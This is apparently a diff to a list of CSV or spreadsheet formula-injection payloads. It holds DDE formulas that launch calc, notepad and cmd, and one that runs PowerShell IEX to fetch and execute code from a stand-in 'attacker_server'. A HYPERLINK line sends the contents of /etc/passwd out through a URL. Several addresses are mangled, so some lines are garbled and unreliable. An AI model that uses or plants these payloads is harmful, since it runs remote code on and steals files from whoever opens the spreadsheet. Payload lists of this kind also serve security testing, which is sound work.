@@ -3,5 +3,4 @@ SUM()*cmd|'  calc'!A,second
 0+cmd|'  calc'!A0,third
 cmd|'  notepad'!'A',fourth
 cmd|' powershell IEX(wget attacker_servershell)'!A,fifth
-cmd|'c rundll \\.0.0.1\\3\\2\\10'!_xlbgnm.A1,sixth
-HYPERLINK(CONCATENATE("http:/.0.0.0:0/.txt?v=" ('file:///etc/passwd'#$passwd.A1)); "testpoc"),seventh
+HYPERLINK(CONCATENATE("http:/.0.0.0:0/.txt?v=" ('file:///etc/passwd'#$passwd.A1)); "testpoc"),sixth
